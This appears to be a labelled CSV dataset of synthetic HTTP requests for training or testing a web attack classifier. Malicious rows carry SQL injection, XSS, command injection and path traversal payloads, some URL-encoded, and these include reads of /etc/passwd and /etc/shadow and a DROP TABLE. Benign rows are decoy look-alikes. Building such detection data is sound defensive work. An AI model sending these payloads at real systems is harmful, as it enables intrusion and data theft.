method,url,headers,body,label
PUT,/login?page=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: 7fpOd2BqhK4d",,0
PUT,/product?lang=alert%2528String.fromCharCode%252888%252C83%252C83%2529%2529,"User-Agent: Mozilla/5.0
X-Request-ID: y9m9ZsN9KBAG",,1
POST,/search?lang=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: BtIEqvynuvOn",,0
GET,/blog?id=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: CRHrEwwlNgk6",,1
GET,/api/user?file=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: PinLW8CIPAgM",,0
PUT,/checkout?search=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: oqdRc7pkmbFH",,0
PUT,/checkout?query=<img src=x onerror=alert(1)>,"User-Agent: Mozilla/5.0
X-Request-ID: mlSEW7g0dhzs",,1
GET,/images?username=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: k4TLkQovtLVC",,0
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: jAroICWOgmau",page=$(whoami),1
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: PTdq410xVOKz",ref=%253Cscript%253Ealert%25281%2529%253C/script%253E,1
PUT,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: 4J9Xh3nPmC5K",search=<svg/onload=alert(1)>,1
POST,/blog?ref=%2527%2520UNION%2520SELECT%2520NULL%252CNULL%2520--,"User-Agent: Mozilla/5.0
X-Request-ID: G5wVeTz0UDDG",,1
POST,/login?id=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: 8l6NvShdEfrD",,0
GET,/api/user?page=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: u0qvM3fUDOBv",,0
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: f00xLbvnoQqa",page=%253Cscript%253Ealert%25281%2529%253C/script%253E,1
PUT,/checkout?id=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: 3DPIkaytKAvf",,0
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: rjF9aofEWBys",id=%253Csvg/onload%253Dalert%25281%2529%253E,1
PUT,/images?query=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/5.0
X-Request-ID: BhAcSOUQj2LK",,1
PUT,/search?lang=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: kDRR7cJh2fRQ",,0
GET,/search,"User-Agent: Mozilla/5.0
X-Request-ID: jg3Q3syJgTWm",id=%2524%2528whoami%2529,1
POST,/docs?search=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: MSy4vLdxh8m7",,0
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: HDZlrigWuIdg",username=../../etc/passwd,1
GET,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: HmVcMmPtN604",lang=' AND SLEEP(5)--,1
POST,/blog?ref=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/5.0
X-Request-ID: HzuNGf6OiBYJ",,1
GET,/login?search=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: Y8nLZn8KEgUM",,0
PUT,/images?username=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: 1BC8Y3z8ykO9",,0
POST,/checkout?id=' OR 1=1 --,"User-Agent: Mozilla/5.0
X-Request-ID: NX0lht1Khu2i",,1
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: 695UMv4LPfRa",id=%2527%2520OR%25201%253D1%2520--,1
GET,/api/user?id=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: lg8oIwPbyhNO",,1
PUT,/product?ref=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: wTZuTJKqcvcB",,0
GET,/checkout?q=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: rvDBSz1ffML4",,0
PUT,/checkout?username=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: VqmbbtFOfgGN",,0
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: jXmqGYbjwuQW",id=%253B%2520ls%2520-la,1
GET,/docs?file=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: aIICVKut0QoG",,0
POST,/search?id=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: xqx6VLC5POkK",,0
GET,/docs?lang=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: Qb94OcOLZmCs",,0
POST,/search?search=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: wdp6E6wFyahR",,0
GET,/images?lang=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: tj1TSswaKeVC",,0
GET,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: UWbpQhpZUQpa","search=alert(String.fromCharCode(88,83,83))",1
POST,/login?search=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: mqIoSH9iB1oQ",,1
PUT,/checkout?ref=| whoami,"User-Agent: Mozilla/5.0
X-Request-ID: mJYCZnkr6ybV",,1
PUT,/product?search=%2527%2520AND%2520SLEEP%25285%2529--,"User-Agent: Mozilla/5.0
X-Request-ID: H0SkBtrRYqr6",,1
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: vn7thqoUVUXO",username=/etc/shadow,1
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: 1MMbrfNetzbn",lang=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: nOttpdoTLqLH",search=' AND SLEEP(5)--,1
POST,/images?id=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: ofekSdsLNme8",,0
PUT,/api/user?q=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: BrgoHiZE0G6D",,0
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: j2nI22J6QMNF",lang=/etc/shadow,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: H1Yz9ZLuyeBB",q=%26%26%20cat%20/etc/passwd,1
PUT,/images?ref=<script>alert(1)</script>,"User-Agent: Mozilla/5.0
X-Request-ID: rR9QrosFgEyA",,1
PUT,/search?ref=%3B%20ls%20-la,"User-Agent: Mozilla/5.0
X-Request-ID: 0L9x4wInnQJo",,1
POST,/images?file=%27%20UNION%20SELECT%20NULL%2CNULL%20--,"User-Agent: Mozilla/5.0
X-Request-ID: ftiSrsicAXbl",,1
PUT,/login?username=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: dW5a9fqulCUZ",,0
PUT,/product?query=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: n8Djmiwy10Pv",,0
PUT,/login?id=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: 1OPNlGjBKgHh",,0
POST,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: vgmMC4Wt4VAh",lang=alert%28String.fromCharCode%2888%2C83%2C83%29%29,1
POST,/api/user?lang=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: A97Lg6LqTvsw",,0
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: nNcdMHj8kriX",query=%253Cscript%253Ealert%25281%2529%253C/script%253E,1
POST,/api/user?page=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: qEt3HEWeD4SV",,0
GET,/search?query=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 25Pjni8J68rV",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: zgJKVVwys5Mn",ref=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: sdVQbG2iweOT",ref=<svg/onload=alert(1)>,1
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: jvUa81in1SjQ",username=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: qfpZYj9rKuRD",search=%2527%2520AND%2520SLEEP%25285%2529--,1
POST,/api/user?lang=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: 5xwPnjhHWOXi",,1
PUT,/product?ref=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: VStkqdQ5OTXQ",,1
GET,/docs?ref=$(whoami),"User-Agent: Mozilla/5.0
X-Request-ID: cxrzL4ASmfMD",,1
POST,/checkout?file=| whoami,"User-Agent: Mozilla/5.0
X-Request-ID: ZpQ34kRyMFYg",,1
POST,/login?username=%3B%20ls%20-la,"User-Agent: Mozilla/5.0
X-Request-ID: 50fSsBuQmbkP",,1
PUT,/docs?query=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: XWstkt5Gx1pX",,0
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: Oa6uA0AOAKAY",file=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/docs?search=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: GZ5fjsseuZCP",,0
POST,/images?ref=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: pj0PWOu1UHae",,0
PUT,/search?page=%7C%20whoami,"User-Agent: Mozilla/5.0
X-Request-ID: fX8YgvYlyOlm",,1
PUT,/checkout?search=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: 0ANYmocWCynD",,0
PUT,/docs?file=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: BCthYXEk4nmh",,0
PUT,/product?q=alert%28String.fromCharCode%2888%2C83%2C83%29%29,"User-Agent: Mozilla/5.0
X-Request-ID: hvQKPZc6yhGz",,1
GET,/api/user?file=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: hFhRA9Dnqjv9",,0
PUT,/blog?q=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: nV63DhK8Lhbq",,1
POST,/search?ref=%253Csvg/onload%253Dalert%25281%2529%253E,"User-Agent: Mozilla/5.0
X-Request-ID: tHOc6nnMcgmP",,1
PUT,/product?search=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: avo2KuiN44yZ",,0
POST,/docs?lang=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: NXFRbfHTlWi8",,1
PUT,/login?lang=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: lIKVt9Ag47l4",,0
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: gdIRwakuYllo",lang=&& cat /etc/passwd,1
PUT,/checkout?query=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: s7CwhtepE31X",,0
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: 9O0dPtSHtI7t",q=../../etc/passwd,1
GET,/api/user?lang=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: BTBOUVY21cfZ",,1
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: 7bLHqqtJm9EU",query=../../etc/passwd,1
PUT,/api/user?ref=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: 7SSqKg3WpfXr",,0
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: nBF4andxWRGc","search=' UNION SELECT NULL,NULL --",1
GET,/images?search=%27%20UNION%20SELECT%20NULL%2CNULL%20--,"User-Agent: Mozilla/5.0
X-Request-ID: EnKQTwGEjBxE",,1
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: YhQ0H4mbQjCq",ref='; DROP TABLE users; --,1
GET,/product?ref=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: qHDxJz1BvpK9",,0
GET,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: tittJiTWezNG",id=%257C%2520whoami,1
PUT,/product?ref=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: st1O6mhSRV7z",,0
POST,/login?q=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: BSzGt8etVEKu",,0
PUT,/product?file=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: kfWavohVGOvz",,0
PUT,/docs?page=%257C%2520whoami,"User-Agent: Mozilla/5.0
X-Request-ID: p80SZSXL8Xmb",,1
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: Y9L16TgWp1oI",q=....//....//etc/passwd,1
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: u8fKJZtcSXKV",query=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
GET,"/api/user?ref=alert(String.fromCharCode(88,83,83))","User-Agent: Mozilla/5.0
X-Request-ID: Q39N7ltqAOpf",,1
POST,/docs?username=%3Csvg/onload%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: nZ1MNeDcTjK4",,1
POST,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: V2nvz2DlodIq",query=<svg/onload=alert(1)>,1
POST,/images?ref=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: qQsSvp7NZPzj",,0
PUT,/docs?username=' OR 1=1 --,"User-Agent: Mozilla/5.0
X-Request-ID: q0IFqaVYR0PH",,1
PUT,/search,"User-Agent: Mozilla/5.0
X-Request-ID: PQOv9um1rpJ3",ref=<img src=x onerror=alert(1)>,1
POST,/search?q=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: 1kp8hUB861Vr",,0
PUT,/api/user?page=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: btYvauqqePI1",,0
POST,/product?ref=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: uZjqs6oY9pUB",,0
POST,/docs?file=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: 0ALzyRVV4JSd",,0
PUT,/blog?username=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: ruWpIe0SNyJS",,0
GET,/search?username=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: AvB7YcsvHN19",,0
GET,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: nkQeZsS8JyHj",username=%2527%2520OR%25201%253D1%2520--,1
POST,/blog?username=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: tSojkW1WUSqq",,0
GET,/product?search=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 9XBFAYihq6Rk",,0
GET,/api/user?id=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: HJwLOBYpGMFS",,0
POST,/search?ref=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: fbtu3dyRfqou",,0
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: jTLcnqptKXwd",username=; ls -la,1
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: jg18ghJ1RxL4",search=%7C%20whoami,1
PUT,/docs?page=%253Cscript%253Ealert%25281%2529%253C/script%253E,"User-Agent: Mozilla/5.0
X-Request-ID: lQ1CzkKjOY0j",,1
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: W8KcGjaWvCCX",search=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1
POST,/images,"User-Agent: Mozilla/5.0
X-Request-ID: WLss5TRRCEeQ",file=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
PUT,/login?file=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: kBkv5xr4M3RC",,0
GET,/checkout?query=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: HbOG660t1JQd",,0
GET,/images?lang=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: UygFTFuyscLf",,0
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: 9lH1JKcVHwwL",lang=%27%3B%20DROP%20TABLE%20users%3B%20--,1
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: Z6vVGV4qWTzT",ref=' OR 1=1 --,1
PUT,/images?q=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: FifkJfUfm6Ow",,0
POST,/search?page=<svg/onload=alert(1)>,"User-Agent: Mozilla/5.0
X-Request-ID: epQVOimnHaeR",,1
POST,/blog?lang=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: 0sgzQ3xG3XxB",,1
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: M2M35KU95Vgw",username=/etc/shadow,1
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: O8ImYL4nTKBr",file=<svg/onload=alert(1)>,1
GET,/docs?ref=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: L3affgV28dMd",,0
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: pLsoXVGuZlJf",page=....//....//etc/passwd,1
POST,/checkout?id=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: bqSi1bASuqcf",,0
POST,/search?username=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: nUd0HyLooS74",,0
POST,/api/user?id=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: Ze60UsbXRbU3",,0
GET,/product?lang=orchestra concert,"User-Agent: Mozilla/5.0
X-Request-ID: 8ahw0ZYhyFAF",,0
POST,/docs?ref=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: 0UlB9hFIHtd3",,0
PUT,/login?search=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: B8vlers9sytF",,0
POST,/product?ref=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: cOr7Otf2zSms",,0
GET,/search?ref=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: CRVtZJPcOeRJ",,0
PUT,/checkout?ref=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: c0RXQnDuiZBW",,0
POST,/blog?search=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: HvbgUBm1G5fj",,0
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: A7S6QMtMpH2b",page=' AND SLEEP(5)--,1
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: 6uB958tDLZKN",search=<svg/onload=alert(1)>,1
PUT,/checkout?search=<script>alert(1)</script>,"User-Agent: Mozilla/5.0
X-Request-ID: wFWsJfYnp1SQ",,1
PUT,/search?q=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: u608trdQgPfE",,0
POST,/login?search=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: X2ZJtuSFo8Ax",,0
PUT,/checkout?username=1 OR TRUE,"User-Agent: Mozilla/5.0
X-Request-ID: Sz7oao8Qm1uz",,1
GET,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: TM0bjCKvA6xA",search=<svg/onload=alert(1)>,1
GET,/product?q=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: NfNVWlmSGjfy",,0
GET,/blog?file=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: vmpNpkE39wU0",,0
PUT,/images?ref=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: sWZt9hnlpaSO",,0
POST,"/blog?page=' UNION SELECT NULL,NULL --","User-Agent: Mozilla/5.0
X-Request-ID: urDMxC4AJ5QO",,1
PUT,/product?lang=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: NlvPa3zWuSB3",,1
GET,/api/user?page=%3Cscript%3Ealert%281%29%3C/script%3E,"User-Agent: Mozilla/5.0
X-Request-ID: neTkBqnKCwGe",,1
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: VicovBH5k5vZ",query=%7C%20whoami,1
POST,/search?query=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: CntTOjRPXVdm",,0
POST,/images?file=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: a2m1OmOetYEw",,0
POST,/images?lang=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: 04ncHoJiVmUI",,0
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: NvKNKjHwC58W","q=alert(String.fromCharCode(88,83,83))",1
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: yZw0zQCFVP7k",q=%3B%20ls%20-la,1
POST,/blog?query=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: FLMZvlShDiFJ",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: ENArYnoouDdK",id=%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1
GET,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: lZ8jypEgtFUC",id=<svg/onload=alert(1)>,1
PUT,/images?search=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: QlceWLPpahqb",,0
GET,/product?page=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: a9ErCz4x4eUj",,0
GET,/login?ref=%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,"User-Agent: Mozilla/5.0
X-Request-ID: xIAHPXR6D6uU",,1
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: 4lmcoxT0PPHI",page=alert%28String.fromCharCode%2888%2C83%2C83%29%29,1
POST,/checkout?page=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: 4IucextZbcZZ",,0
PUT,/checkout,"User-Agent: Mozilla/5.0
X-Request-ID: kQScr4QWTwKU",id=../../etc/passwd,1
GET,/docs?file=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: 8CwnFv7GBgH0",,0
PUT,/checkout?id=filename=report_v2.pdf,"User-Agent: Mozilla/5.0
X-Request-ID: yKCjV9eLixXC",,0
GET,/api/user?ref=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: ZMcMwwp4Kqwq",,0
PUT,/blog?id=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: KHRyr6BERKgy",,0
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: 3Km7mqblEdxS",q=' AND SLEEP(5)--,1
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: 3j5p4nRlFurk",page=&& cat /etc/passwd,1
GET,/checkout?q=category=electronics&sort=asc,"User-Agent: Mozilla/5.0
X-Request-ID: FIEPJpPkIYHX",,0
POST,/blog?file=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: UTlqnWOvYxeA",,0
GET,/search?lang=price>100,"User-Agent: Mozilla/5.0
X-Request-ID: OlY027nPtWlu",,0
GET,/images?id=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 7QzwfEDiJ1jQ",,0
GET,/search,"User-Agent: Mozilla/5.0
X-Request-ID: 5QJlp7Y7pxpD",q=/etc/shadow,1
GET,/images?lang=%3B%20ls%20-la,"User-Agent: Mozilla/5.0
X-Request-ID: 25YeR2axFAkf",,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: HOaatfdd5BXP","search=alert(String.fromCharCode(88,83,83))",1
GET,/product?file=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: jLquHKWSoDpt",,1
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: vLqW0OTmTDRu",file=%26%26%20cat%20/etc/passwd,1
GET,/login?query=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: IocD8HJE5mwZ",,0
PUT,/images?search=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: 1Bgdh537ZOE6",,0
PUT,/search?ref=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: M68RZxYs3eTL",,0
PUT,/product?page=%26%26%20cat%20/etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: dwZCieo5QAao",,1
GET,/images?ref=%27%3B%20DROP%20TABLE%20users%3B%20--,"User-Agent: Mozilla/5.0
X-Request-ID: ZZhMoqmfm4id",,1
PUT,/docs?q=summer_sale_2025,"User-Agent: Mozilla/5.0
X-Request-ID: lUTA0dMSCsxP",,0
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: wep1a06hUTn0",query=%2527%2520OR%25201%253D1%2520--,1
PUT,/images?id=&& cat /etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: ReRdqeYYg9k6",,1
PUT,/docs?lang=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: EDOgxoWxqIWo",,0
POST,/login,"User-Agent: Mozilla/5.0
X-Request-ID: pRf8lWfQsLfM",id=1%20OR%20TRUE,1
POST,/product?ref=data%20science%20course,"User-Agent: Mozilla/5.0
X-Request-ID: g4X7thGUvw0p",,0
GET,/images?q=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: riicwKdM3cO5",,0
PUT,/images?file=C++ programming tutorial,"User-Agent: Mozilla/5.0
X-Request-ID: mbM3Xvch1rjh",,0
PUT,/login?username=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: Df80IsR0PFFU",,0
POST,/checkout?username=selective filtering,"User-Agent: Mozilla/5.0
X-Request-ID: Nul2zOHPKfbZ",,0
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: UdtPgKVkf1gN",lang=<img src=x onerror=alert(1)>,1
POST,/login?id=whoami book review,"User-Agent: Mozilla/5.0
X-Request-ID: e8nI77A6dfjl",,0
GET,/checkout?ref=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: 12S8J2cp2R7w",,1
GET,/images?username=../../etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: amwd1RNUOCYQ",,1
PUT,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: C38TCNizJUIz",page=/etc/shadow,1
PUT,/blog?page=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: iw26Cde5n63g",,0
GET,/api/user?username=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: jlq8Nz3D3qR2",,0
PUT,/api/user?query=%7C%20whoami,"User-Agent: Mozilla/5.0
X-Request-ID: azksBMwxDe7t",,1
POST,/product?query=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: Bc9t8fSvVODH",,0
POST,/checkout?ref=....//....//etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: Dq3APP3SH4NM",,1
GET,/api/user?q=john_doe_1998,"User-Agent: Mozilla/5.0
X-Request-ID: 17N5nNbx1hev",,0
GET,/checkout?search=%27%20UNION%20SELECT%20NULL%2CNULL%20--,"User-Agent: Mozilla/5.0
X-Request-ID: l9TTrnF80TKS",,1
PUT,/docs,"User-Agent: Mozilla/5.0
X-Request-ID: 3oic65JQI3LB",q=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
PUT,/images,"User-Agent: Mozilla/5.0
X-Request-ID: A1yp5OH6mqVL",lang=%3Cscript%3Ealert%281%29%3C/script%3E,1
PUT,"/docs?username=' UNION SELECT NULL,NULL --","User-Agent: Mozilla/5.0
X-Request-ID: kxEhtvGkv5zT",,1
GET,/docs?search=script analysis tool,"User-Agent: Mozilla/5.0
X-Request-ID: R1zIG6slTmHW",,0
PUT,/blog?lang=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: p708PmX1WAke",,0
PUT,/search?file=100%25 organic food,"User-Agent: Mozilla/5.0
X-Request-ID: oLbVYWlg3c0s",,0
PUT,/images?lang=select union workers,"User-Agent: Mozilla/5.0
X-Request-ID: OUedzQNmExup",,0
GET,/search?username=../images/banner.png,"User-Agent: Mozilla/5.0
X-Request-ID: 0OjJZreAh9qv",,0
POST,/login?username=drop shipping business,"User-Agent: Mozilla/5.0
X-Request-ID: 6AS32fQImSAj",,0
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: eIsP8bKK4gq8",search=alert%28String.fromCharCode%2888%2C83%2C83%29%29,1
